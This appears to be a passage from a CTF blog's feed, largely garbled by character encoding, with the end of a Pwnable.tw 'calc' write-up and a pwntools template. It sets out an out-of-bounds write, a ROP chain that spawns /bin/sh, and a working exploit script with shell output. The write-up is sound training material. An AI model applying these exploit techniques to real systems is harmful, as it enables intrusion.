æ‰€ä»¥ç¬¬ä¸€å€‹åˆ¤æ–·ä¸æœƒé€²ï¼Œå¾Œé¢ä¸æ˜¯ç¬¦è™Ÿæ‰€ä»¥ä¹Ÿä¸æœƒé€²éŒ¯èª¤ã€‚</li><li><code>operators_array[operators_array_index]</code> æ˜¯ç©ºçš„æ‰€ä»¥æœƒåŸ·è¡Œ<code>operators_array[0] = &#39;+&#39;</code>ï¼Œå¾Œé¢é‚„æœ‰æ±è¥¿æ‰€ä»¥ç¹¼çºŒåŸ·è¡Œã€‚</li></ol><ul><li>ç¬¬äºŒå€‹åŠ è™Ÿ</li></ul><ol><li>ä¸€æ¨£æœƒé€šéæœ€å¤–å±¤çš„ <code>if</code>ï¼Œ<code>part_input = 12</code>ï¼Œé 0 æ‰€ä»¥ä¸æœƒé€²éŒ¯èª¤ã€‚</li><li>æ•´æ•¸ 56 å¤§æ–¼ 0ï¼Œæ‰€ä»¥æœƒåŸ·è¡Œä»¥ä¸‹çš„ç¨‹å¼ç¢¼ï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    pool_index = (*pool)++;</span><br><span class="line">    pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>ä¹Ÿå°±æ˜¯ï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = pool[<span class="number">0</span>] = <span class="number">0</span>; </span><br><span class="line">pool[<span class="number">0</span>] += <span class="number">1</span>;</span><br><span class="line">pool[<span class="number">1</span>] = part_input_int = <span class="number">12</span>;</span><br></pre></td></tr></table></figure></div>ä¸‹å€‹å­—å…ƒä¸æ˜¯ç¬¦è™Ÿä¸æœƒé€²éŒ¯èª¤ã€‚</li><li>ç¬¦è™Ÿé™£åˆ—å·²ç¶“å­˜äº†ä¸€å€‹ <code>&#39;+&#39;</code> æ‰€ä»¥æœƒåŸ·è¡Œï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(pool, operators_array[operators_array_index]);</span><br><span class="line">operators_array[operators_array_index] = *(_BYTE *)(i + input);</span><br></pre></td></tr></table></figure></div>ä¹Ÿå°±æ˜¯ï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(pool, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="comment">// é€²å…¥ eval()</span></span><br><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br><span class="line"><span class="comment">// é›¢é–‹ eval()</span></span><br><span class="line">operators_array[<span class="number">0</span>] = <span class="string">&#x27;+&#x27;</span>;</span><br></pre></td></tr></table></figure></div>æˆ‘å€‘å†ç´°çœ‹ä¸€ä¸‹ <code>pool[pool[0] - 1] += pool[pool[0]];</code>ï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pool[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">pool[<span class="number">1</span><span class="number">-1</span>] = pool[<span class="number">0</span>]</span><br><span class="line">pool[<span class="number">0</span>] += pool[<span class="number">1</span>] = <span class="number">12</span></span><br><span class="line">pool[<span class="number">0</span>] + <span class="number">1</span> - <span class="number">1</span> = <span class="number">12</span></span><br></pre></td></tr></table></figure></div>é—œéµå°±åœ¨é€™è£¡ï¼Œä½œç‚ºç›¸å°ä½å€åŸºå€¼çš„ç¬¬é›¶æ ¼è¢«æˆ‘å€‘ç¯¡æ”¹äº†ï¼<br>æ¥ä¸‹å°±æœƒå†åŸ·è¡Œä¸€æ¬¡ä¸‹é¢å…©æ®µç¨‹å¼ç¢¼ï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.</span></span><br><span class="line">pool_index = (*pool)++;</span><br><span class="line">pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br></pre></td></tr></table></figure></div>ä¹Ÿå°±æ˜¯ï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.</span></span><br><span class="line">pool_index = pool[<span class="number">0</span>]++ = <span class="number">13</span>;</span><br><span class="line">pool[<span class="number">0</span>] = <span class="number">14</span></span><br><span class="line">pool[<span class="number">13</span> + <span class="number">1</span>] = <span class="number">34</span></span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line">pool[<span class="number">14</span> - <span class="number">1</span>] += pool[<span class="number">14</span>] = <span class="number">34</span></span><br><span class="line">pool[<span class="number">13</span>] = pool[<span class="number">13</span>] + <span class="number">34</span></span><br><span class="line">pool[<span class="number">0</span>] - <span class="number">1</span> = <span class="number">13</span></span><br></pre></td></tr></table></figure></div>é€™ä»£è¡¨æˆ‘å€‘å¯ä»¥åšåˆ°ä»»æ„å¯«å’Œä»»æ„è®€ï¼Œç¢ºèªä¸€ä¸‹è¼¸å‡ºçš„ä½ç½®æ˜¯å“ªè£¡ï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">parse_expr</span>((<span class="type">int</span>)input, pool) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pool[pool[<span class="number">0</span>]]);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>æ‰€ä»¥æœƒå°å‡º <code>pool[pool[0]]</code>:<br>åœ¨é€™è£¡çš„æƒ…æ³å°±æ˜¯<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[<span class="number">0</span>] = <span class="number">13</span></span><br><span class="line">pool[pool[<span class="number">0</span>]] = pool[<span class="number">13</span>]</span><br></pre></td></tr></table></figure></div>æ‰€ä»¥æœƒå°å‡º pool[13] &#x3D; pool[13] + 34<br>æˆ‘å€‘ä¾†æŠŠçµè«–ä»£æ•¸åŒ–æ–¹ä¾¿æˆ‘å€‘ç†è§£ä»–å€‘çš„é—œä¿‚ï¼š<br>å‡è¨­ x, y çš†ç‚ºæ­£æ•´æ•¸ã€‚</li></ol><h3 id="Case-1-x"><a href="#Case-1-x" class="headerlink" title="Case 1: +x"></a>Case 1: +x</h3><p>åŸ·è¡Œ 1ï¼š</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    pool_index = (*pool)++;</span><br><span class="line">    pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>çµæœ 1ï¼š</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = pool[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">pool[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">pool[<span class="number">1</span>] = x</span><br></pre></td></tr></table></figure></div><p>åŸ·è¡Œ 2:</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br></pre></td></tr></table></figure></div><p>çµæœ 2:</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[<span class="number">0</span>] += pool[<span class="number">1</span>] = x </span><br><span class="line">pool[<span class="number">0</span>] = x + <span class="number">1</span> - <span class="number">1</span> = x</span><br></pre></td></tr></table></figure></div><p>å°å‡ºï¼š</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>]] = pool[x]</span><br></pre></td></tr></table></figure></div><h3 id="Case-2-x-y"><a href="#Case-2-x-y" class="headerlink" title="Case 2: +x+y"></a>Case 2: +x+y</h3><p>åŸºæ–¼ä¸Šé¢çš„çµæœæˆ‘å€‘å†åŠ  yï¼š<br>ç›®å‰ï¼š</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = <span class="number">0</span></span><br><span class="line">pool[<span class="number">0</span>] = x</span><br><span class="line">pool[<span class="number">1</span>] = x </span><br></pre></td></tr></table></figure></div><p>åŸ·è¡Œ 1ï¼š</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    pool_index = (*pool)++;</span><br><span class="line">    pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>çµæœ 1ï¼š</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = pool[<span class="number">0</span>] = x</span><br><span class="line">pool[<span class="number">0</span>] = x + <span class="number">1</span></span><br><span class="line">pool[x + <span class="number">1</span>] = y</span><br></pre></td></tr></table></figure></div><p>åŸ·è¡Œ 2:</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br></pre></td></tr></table></figure></div><p>çµæœ 2:</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pool[x + <span class="number">1</span> - <span class="number">1</span>] += pool[x + <span class="number">1</span>] = y</span><br><span class="line">pool[x] += y</span><br><span class="line">pool[x] = pool[x] + y</span><br><span class="line">pool[<span class="number">0</span>] = x</span><br></pre></td></tr></table></figure></div><p>å°å‡ºï¼š</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>]] = pool[x] = pool[x] + y</span><br></pre></td></tr></table></figure></div><h3 id="ä»£æ•¸åŒ–çµè«–"><a href="#ä»£æ•¸åŒ–çµè«–" class="headerlink" title="ä»£æ•¸åŒ–çµè«–"></a>ä»£æ•¸åŒ–çµè«–</h3><ul><li>+x<ul><li>å°å‡º pool[x]</li></ul></li><li>+x+y<ul><li>pool[x] &#x3D; pool[x] + y</li><li>pool[x + 1] &#x3D; y</li><li>å°å‡º pool[x] &#x3D; pool[x] + y</li></ul></li></ul><p>æˆ‘å€‘åŸ·è¡Œä¸€å€‹ç‰¹æ®Šçš„ case ç¢ºèªä¸€ä¸‹æˆ‘å€‘çš„æ¨è«–ï¼š<br>å› ç‚ºè¿´åœˆæ¯æ¬¡éƒ½æœƒåŸ·è¡Œ <code>init_pool(pool);</code><br>æ‰€ä»¥ case æœƒæŒ‘ pool å¤–çš„åœ°å€</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">â””â”€$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+400      <span class="comment"># print(pool[400])</span></span><br><span class="line">-1715908  <span class="comment"># pool[400]</span></span><br><span class="line">+399+123  <span class="comment"># pool[400] = 123 print(pool[399] + 123)</span></span><br><span class="line">123       <span class="comment"># pool[399] + 123</span></span><br><span class="line">+400      <span class="comment"># print(pool[400])</span></span><br><span class="line">123       <span class="comment"># pool[400]</span></span><br></pre></td></tr></table></figure></div><h3 id="çµè«–æ­£ç¢ºï¼"><a href="#çµè«–æ­£ç¢ºï¼" class="headerlink" title="çµè«–æ­£ç¢ºï¼"></a>çµè«–æ­£ç¢ºï¼</h3><h2 id="0x4-Exploitation"><a href="#0x4-Exploitation" class="headerlink" title="0x4 Exploitation"></a>0x4 Exploitation</h2><p>æˆ‘å€‘å·²ç¶“å¯ä»¥åšåˆ°ä»»æ„çš„ oob write &amp; read äº†ï¼Œå†ä¾†å°±æ˜¯æ‰¾ ret è·Ÿ pool çš„ç›¸å°ä½ç½®ï¼š<br>åœ¨ ida æœ‰å¾ˆè²¼å¿ƒçš„å¹«æˆ‘å€‘æ¨™ç¤º <code>pool[]</code> çš„ä½ç½®ï¼š<br><code>int pool[101]; // [esp+18h] [ebp-5A0h] BYREF</code><br>åˆ <code>cal()</code> çš„ ret åœ¨ ebp + 0x4ï¼Œ<br>0x5A0 + 0x4 &#x3D; 0x5A4 &#x2F; 4 &#x3D; 361<br>æ‰€ä»¥ ret åœ¨ <code>pool[361]</code> çš„ä½ç½®ã€‚<br>é‚£æœ€ä¸€é–‹å§‹æœ‰æåˆ°é€™é¡Œæœ‰é–‹ NX ä¸èƒ½ç›´æ¥å¯« shellcodeï¼Œä½†å› ç‚ºæ˜¯ statically linkedï¼Œæ‰€ä»¥æˆ‘æœƒæƒ³å…ˆå˜—è©¦ rop é–‹ shellã€‚<br>æˆ‘å€‘é‚„éœ€è¦çŸ¥é“ main_ebp çš„ä½ç½®ï¼Œå› ç‚ºé€™é¡Œæ‰¾ä¸åˆ° â€œ\bin\shâ€ï¼Œæ‰€ä»¥æˆ‘å€‘è¦è‡ªå·±å¡«å†è·³ä¸Šå»ï¼Œå› æ­¤æœƒéœ€è¦ leak main_ebpã€‚<br>é‚£ leak çš„æ–¹å¼ä¹Ÿå¾ˆç°¡å–®ï¼Œå› ç‚º pool[360] å°±æ˜¯å­˜ main_ebp æ‰€ä»¥å¯ä»¥é€éè¼¸å…¥ +360 ä¾†ç²å¾—ã€‚<br>ç­‰ç­‰æœƒç›´æ¥æŠŠ <code>/bin/sh</code> æ”¾åœ¨ <code>in 0x80</code> å¾Œé¢ï¼Œæ‰€ä»¥æŠŠ stack frame ç”¨ gdb é‡æ¸…ä¸€ä¸‹ï¼Œé€²åˆ° <code>calc()</code> å¾Œå°å‡º <code>$ebp</code>ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  x <span class="variable">$ebp</span></span><br><span class="line">0xffffd278:     0xffffd298</span><br></pre></td></tr></table></figure></div><p>æ‰€ä»¥å¯ä»¥å¾—çŸ¥ calc_ebp åˆ° main_ebp çš„è·é›¢ç‚º 0x20ã€‚<br>ä¾†ç”¨è¡¨æ ¼å‘ˆç¾ä¸€ä¸‹æˆ‘å€‘çš„ ROP chainï¼š</p><table><thead><tr><th align="center">Stack</th><th align="center">pool</th><th align="center">value</th><th align="center">Note</th></tr></thead><tbody><tr><td align="center">calc_ebp</td><td align="center">pool[360]</td><td align="center">main_ebp</td><td align="center"></td></tr><tr><td align="center">calc_ret</td><td align="center">pool[361]</td><td align="center">0x0805c34b</td><td align="center">pop_eax</td></tr><tr><td align="center">main_ebp-0x18</td><td align="center">pool[362]</td><td align="center">0x0b</td><td align="center">11</td></tr><tr><td align="center">main_ebp-0x14</td><td align="center">pool[363]</td><td align="center">0x080701d0</td><td align="center">pop_edx_ecx_ebx</td></tr><tr><td align="center">main_ebp-0x10</td><td align="center">pool[364]</td><td align="center">0x0</td><td align="center"></td></tr><tr><td align="center">main_ebp-0xc</td><td align="center">pool[365]</td><td align="center">0x0</td><td align="center"></td></tr><tr><td align="center">main_ebp-0x8</td><td align="center">pool[366]</td><td align="center">main_ebp</td><td align="center">bin_sh_addr</td></tr><tr><td align="center">main_ebp-0x4</td><td align="center">pool[367]</td><td align="center">0x08049a21</td><td align="center">int 0x80</td></tr><tr><td align="center">main_ebp</td><td align="center">pool[368]</td><td align="center">u32(â€œ&#x2F;binâ€)</td><td align="center"></td></tr><tr><td align="center">main_ret</td><td align="center">pool[369]</td><td align="center">u32(â€œ&#x2F;sh\0â€)</td><td align="center"></td></tr></tbody></table><p>å¡«çš„æ™‚å€™è¦æ³¨æ„ä¸èƒ½å–®ç¨å‡ºç¾ 0ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥åˆ©ç”¨ +x+y æœƒæŠŠ pool[x] &#x3D; pool[x] + y çš„ç‰¹æ€§ä¾†æ”¾ç½®æˆ‘å€‘çš„ ropï¼Œå°±å¯ä»¥é¿å…è·³ <code>prevent division by zero</code> çš„éŒ¯èª¤ã€‚</p><h2 id="0x5-Exploit"><a href="#0x5-Exploit" class="headerlink" title="0x5 Exploit"></a>0x5 Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./calc&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10100</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;+360&quot;</span>)</span><br><span class="line">main_ebp = <span class="built_in">int</span>(r.recv())</span><br><span class="line">success(<span class="string">&quot;main_ebp: %s&quot;</span> % <span class="built_in">hex</span>(main_ebp))</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x080701d0</span></span><br><span class="line">int_0x80 = <span class="number">0x08049a21</span></span><br><span class="line"></span><br><span class="line">rop = [pop_eax, <span class="number">0x0b</span>, pop_edx_ecx_ebx, <span class="number">0x0</span>, <span class="number">0x0</span>, main_ebp, int_0x80, u32(<span class="string">&quot;/bin&quot;</span>), u32(<span class="string">&quot;/sh\0&quot;</span>)]</span><br><span class="line"></span><br><span class="line">offset = <span class="number">361</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rop:</span><br><span class="line">    payload = <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(offset)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    temp = <span class="built_in">int</span>(r.recv())</span><br><span class="line">    temp = i - temp</span><br><span class="line">    <span class="keyword">if</span> temp &gt;= <span class="number">0</span>:</span><br><span class="line">        payload += <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(temp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += <span class="built_in">str</span>(temp)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv()</span><br><span class="line">    offset += <span class="number">1</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10100: Done</span><br><span class="line">[+] main_ebp: -0x510cf8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">cat</span> /home/calc/flag</span><br><span class="line">FLAG&#123;??????????????????&#125;</span><br></pre></td></tr></table></figure></div><h2 id="0x6-References"><a href="#0x6-References" class="headerlink" title="0x6 References"></a>0x6 References</h2><p>ä¸€é–‹å§‹åšçš„æ™‚å€™å¿½ç•¥ <code>eval()</code> æœ€å¾Œæœ‰å€‹ <code>--*pool;</code>å°è‡´ä¸€ç›´è¨ˆç®—éŒ¯èª¤QQã€‚<br>é€™é¡Œå¯«äº†è »ä¹…çš„ï¼Œåƒè€ƒäº†å¾ˆå¤šå¤§ä½¬çš„ writeupï¼Œå­¸åˆ°å¥½å¤šæ±è¥¿ï¼Œæœªä¾†æ‡‰è©²ä¹Ÿæœƒç”¨è¡¨æ ¼å’Œæ‹†è§£ç¨‹å¼ç¢¼ä¾†è¼”åŠ©é‡æ¸…æ€ç·’ã€‚<br><a class="link"   href="https://hackmd.io/@Zero871015/pwnable#calc" >https://hackmd.io/@Zero871015/pwnable#calc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/01/calc/" >https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/01/calc/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://blog.csdn.net/weixin_46521144/article/details/118543069" >https://blog.csdn.net/weixin_46521144/article/details/118543069 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwnable-tw-calc&quot;&gt;&lt;a href=&quot;#Pwnable-tw-calc&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.tw - calc&quot;&gt;&lt;/a&gt;Pwnable.tw - calc&lt;/h1&gt;&lt;h3 id=&quot;Descripti</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
    
    <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
    
    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
    
  </entry>
  
  <entry>
    <title>Notes for Pwn</title>
    <link href="https://kazma.tw/2024/02/11/Note-for-Pwn/"/>
    <id>https://kazma.tw/2024/02/11/Note-for-Pwn/</id>
    <published>2024-02-11T07:24:06.000Z</published>
    <updated>2024-02-11T07:48:10.199Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Notes-for-Pwn"><a href="#Notes-for-Pwn" class="headerlink" title="Notes for Pwn"></a>Notes for Pwn</h1><p>æ•´ç†ä¸€äº›å¸¸ç”¨çš„è…³æœ¬å’Œå·¥å…·ã€‚</p><h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">DEBUG_MODE = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setgdb</span>(<span class="params">filename : <span class="built_in">str</span></span>):</span><br><span class="line">    r = process(filename)</span><br><span class="line">    context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span>(DEBUG_MODE):</span><br><span class="line">        r = setgdb(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;&quot;</span>, )</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Notes-for-Pwn&quot;&gt;&lt;a href=&quot;#Notes-for-Pwn&quot; class=&quot;headerlink&quot; title=&quot;Notes for Pwn&quot;&gt;&lt;/a&gt;Notes for Pwn&lt;/h1&gt;&lt;p&gt;æ•´ç†ä¸€äº›å¸¸ç”¨çš„è…³æœ¬å’Œå·¥å…·ã€‚&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
    
    <category term="notes" scheme="https://kazma.tw/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.tw orw Writeup</title>
    <link href="https://kazma.tw/2024/02/07/Pwnable-tw-orw-Writeup/"/>
    <id>https://kazma.tw/2024/02/07/Pwnable-tw-orw-Writeup/</id>
    <published>2024-02-07T08:40:36.000Z</published>
    <updated>2024-02-16T07:57:33.657Z</updated>
    
